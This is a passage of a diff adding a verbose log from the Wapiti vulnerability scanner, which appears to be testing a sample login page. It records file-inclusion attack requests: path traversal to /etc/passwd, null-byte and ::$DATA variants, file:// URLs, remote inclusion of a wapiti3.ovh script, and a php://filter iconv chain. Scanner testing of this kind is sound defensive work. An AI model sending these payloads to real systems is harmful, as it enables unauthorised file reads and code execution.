+	data: username=fuzz&password=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 14:24:15.235 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 14:24:15.245 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=login.php
+2024-03-20 14:24:15.255 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=login.php%00
+2024-03-20 14:24:15.263 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=login.php%3A%3A%24DATA
+2024-03-20 14:24:15.278 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/users/login.php (1)
+	data: username=alice&password=Letm3in_
+2024-03-20 14:24:15.280 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&password=Letm3in_
+2024-03-20 14:24:15.291 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00&password=Letm3in_
+2024-03-20 14:24:15.299 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=%2Fetc%2Fpasswd&password=Letm3in_
+2024-03-20 14:24:15.312 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=%2Fetc%2Fpasswd%00&password=Letm3in_
+2024-03-20 14:24:15.323 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=%2Fetc%2Fservices&password=Letm3in_
+2024-03-20 14:24:15.331 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=%2Fetc%2Fservices%00&password=Letm3in_
+2024-03-20 14:24:15.340 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&password=Letm3in_
+2024-03-20 14:24:15.349 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00&password=Letm3in_
+2024-03-20 14:24:15.359 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA&password=Letm3in_
+2024-03-20 14:24:15.367 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&password=Letm3in_
+2024-03-20 14:24:15.377 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&password=Letm3in_
+2024-03-20 14:24:15.391 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA&password=Letm3in_
+2024-03-20 14:24:15.400 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F&password=Letm3in_
+2024-03-20 14:24:15.411 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F&password=Letm3in_
+2024-03-20 14:24:15.423 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&password=Letm3in_
+2024-03-20 14:24:15.435 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&password=Letm3in_
+2024-03-20 14:24:15.449 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&password=Letm3in_
+2024-03-20 14:24:15.460 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&password=Letm3in_
+2024-03-20 14:24:15.470 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&password=Letm3in_
+2024-03-20 14:24:15.481 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&password=Letm3in_
+2024-03-20 14:24:15.496 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&password=Letm3in_
+2024-03-20 14:24:15.511 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&password=Letm3in_
+2024-03-20 14:24:15.525 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&password=Letm3in_
+2024-03-20 14:24:15.537 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&password=Letm3in_
+2024-03-20 14:24:15.552 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&password=Letm3in_
+2024-03-20 14:24:15.565 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&password=Letm3in_
+2024-03-20 14:24:15.580 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp&password=Letm3in_
+2024-03-20 14:24:15.595 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&password=Letm3in_
+2024-03-20 14:24:15.609 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&password=Letm3in_
+2024-03-20 14:24:15.621 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&password=Letm3in_
+2024-03-20 14:24:15.632 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&password=Letm3in_
+2024-03-20 14:24:15.643 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&password=Letm3in_
+2024-03-20 14:24:15.653 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&password=Letm3in_
+2024-03-20 14:24:15.662 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&password=Letm3in_
+2024-03-20 14:24:15.674 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&password=Letm3in_
+2024-03-20 14:24:15.685 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&password=Letm3in_
+2024-03-20 14:24:15.695 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&password=Letm3in_
+2024-03-20 14:24:15.707 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&password=Letm3in_
+2024-03-20 14:24:15.717 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&password=Letm3in_
+2024-03-20 14:24:15.768 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&password=Letm3in_
+2024-03-20 14:24:15.779 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&password=Letm3in_
+2024-03-20 14:24:15.788 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&password=Letm3in_
+2024-03-20 14:24:15.800 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&password=Letm3in_
+2024-03-20 14:24:15.810 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&password=Letm3in_
+2024-03-20 14:24:15.820 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&password=Letm3in_
+2024-03-20 14:24:15.831 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&password=Letm3in_
+2024-03-20 14:24:15.842 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&password=Letm3in_
+2024-03-20 14:24:15.852 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&password=Letm3in_
+2024-03-20 14:24:15.861 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&password=Letm3in_
+2024-03-20 14:24:15.871 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&password=Letm3in_
+2024-03-20 14:24:15.881 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&password=Letm3in_
+2024-03-20 14:24:15.891 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=file%3A%2F%2F%2Fetc%2Fpasswd&password=Letm3in_
+2024-03-20 14:24:15.902 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&password=Letm3in_
+2024-03-20 14:24:15.912 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd&password=Letm3in_
+2024-03-20 14:24:15.922 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00&password=Letm3in_
+2024-03-20 14:24:15.931 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices&password=Letm3in_
+2024-03-20 14:24:15.942 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00&password=Letm3in_
+2024-03-20 14:24:15.953 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&password=Letm3in_
+2024-03-20 14:24:15.962 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&password=Letm3in_
+2024-03-20 14:24:15.975 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=login.php&password=Letm3in_
+2024-03-20 14:24:15.986 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=login.php%00&password=Letm3in_
+2024-03-20 14:24:15.996 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=login.php%3A%3A%24DATA&password=Letm3in_
+2024-03-20 14:24:16.012 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php
+2024-03-20 14:24:16.023 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00
+2024-03-20 14:24:16.032 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=%2Fetc%2Fpasswd
+2024-03-20 14:24:16.041 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=%2Fetc%2Fpasswd%00
+2024-03-20 14:24:16.050 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=%2Fetc%2Fservices
+2024-03-20 14:24:16.061 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=%2Fetc%2Fservices%00
+2024-03-20 14:24:16.072 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices
+2024-03-20 14:24:16.085 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00
+2024-03-20 14:24:16.095 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA
+2024-03-20 14:24:16.106 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 14:24:16.117 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 14:24:16.128 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA
+2024-03-20 14:24:16.139 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F
+2024-03-20 14:24:16.147 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F
+2024-03-20 14:24:16.155 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 14:24:16.162 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
